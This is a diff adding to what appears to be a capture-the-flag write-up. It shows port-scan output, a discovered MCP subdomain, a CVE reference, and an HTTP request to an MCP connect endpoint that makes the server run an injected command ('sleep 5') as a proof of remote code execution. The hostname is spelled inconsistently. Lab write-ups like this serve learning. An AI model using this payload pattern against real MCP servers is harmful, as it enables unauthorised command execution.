@@ -92,4 +92,23 @@ SF:0rel=\"modu");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-then subdomain enumeration i got mcp.kobold
+then subdomain enumeration i got `mcp.kobold.ntb` then found the cve related to it CVE-2026-23520. 
+
+```
+POST /api/mcp/connect HTTP/1.1
+Host: mcp.kobold.htb
+
+{
+  "serverConfig": {
+    "command": "sleep",
+    "args": ["5"]
+  },
+  "serverId": "test"
+}
+
+i think it works
+```
+
+```
+
+```
